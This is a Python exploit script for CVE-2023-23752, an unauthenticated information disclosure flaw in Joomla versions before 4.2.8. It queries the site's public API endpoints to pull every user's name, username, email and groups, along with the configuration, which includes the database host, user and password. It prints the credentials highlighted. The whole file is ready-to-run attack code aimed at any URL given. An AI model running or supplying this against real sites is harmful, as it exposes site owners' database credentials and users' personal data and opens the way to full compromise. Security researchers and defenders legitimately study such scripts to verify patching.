import argparse
import requests
import json
from termcolor import colored

# __author__ = sysevil
# Date: 2023-03-24
# Version: 4.0.0 < 4.2.8 (it means from 4.0.0 up to 4.2.7)
# Tested on: Joomla! Version 4.2.7
# CVE : CVE-2023-23752
# Vendor Homepage: https://www.joomla.org/
# Software Link: https://downloads.joomla.org/cms/joomla4/4-2-7/Joomla_4-2-7-Stable-Full_Package.tar.gz?format=gz

########## libs ###############

# $ pip install requests termcolor
# $ python3 joomla_disclosure.py http://example.com
# $ python3 joomla_disclosure.py http://example.com --debug --no-color

##############################

def fetch_users(root_url):
    vuln_url = f"{root_url}/api/index.php/v1/users?public=true"
    response = requests.get(vuln_url)
    return response.text

def parse_users(root_url):
    data_json = fetch_users(root_url)
    data = json.loads(data_json)['data']
    users = []
    for user in data:
        if user['type'] == 'users':
            id = user['attributes']['id']
            name = user['attributes']['name']
            username = user['attributes']['username']
            email = user['attributes']['email']
            groups = user['attributes']['group_names']
            users.append({'id': id, 'name': name, 'username': username, 'email': email, 'groups': groups})
    return users

def display_users(root_url):
    users = parse_users(root_url)
    print(colored('Users', 'red', attrs=['bold']))
    for u in users:
        print(f"[{u['id']}] {u['name']} ({colored(u['username'], 'yellow')}) - {u['email']} - {u['groups']}")

def fetch_config(root_url):
    vuln_url = f"{root_url}/api/index.php/v1/config/application?public=true"
    response = requests.get(vuln_url)
    return response.text

def parse_config(root_url):
    data_json = fetch_config(root_url)
    data = json.loads(data_json)['data']
    config = {}
    for entry in data:
        if entry['type'] == 'application':
            key = next(iter(entry['attributes']))
            config[key] = entry['attributes'][key]
    return config

def display_config(root_url):
    c = parse_config(root_url)
    print(colored('Site info', 'red', attrs=['bold']))
    print(f"Site name: {c.get('sitename')}")
    print(f"Editor: {c.get('editor')}")
    print(f"Captcha: {c.get('captcha')}")
    print(f"Access: {c.get('access')}")
    print(f"Debug status: {c.get('debug')}")
    print()
    print(colored('Database info', 'red', attrs=['bold']))
    print(f"DB type: {c.get('dbtype')}")
    print(f"DB host: {c.get('host')}")
    print(f"DB user: {colored(c.get('user'), 'yellow', attrs=['bold'])}")
    print(f"DB password: {colored(c.get('password'), 'yellow', attrs=['bold'])}")
    print(f"DB name: {c.get('db')}")
    print(f"DB prefix: {c.get('dbprefix')}")
    print(f"DB encryption: {c.get('dbencryption')}")

def main():
    parser = argparse.ArgumentParser(description='Joomla! < 4.2.8 - Unauthenticated information disclosure')
    parser.add_argument('url', help='Root URL (base path) including HTTP scheme, port, and root folder')
    parser.add_argument('--debug', action='store_true', help='Display arguments')
    parser.add_argument('--no-color', action='store_true', help='Disable colorized output')
    args = parser.parse_args()

    if args.no_color:
        # Disable colorized output
        global colored
        colored = lambda text, *args, **kwargs: text

    if args.debug:
        print(args)

    display_users(args.url)
    print()
    display_config(args.url)

if __name__ == '__main__':
    main()
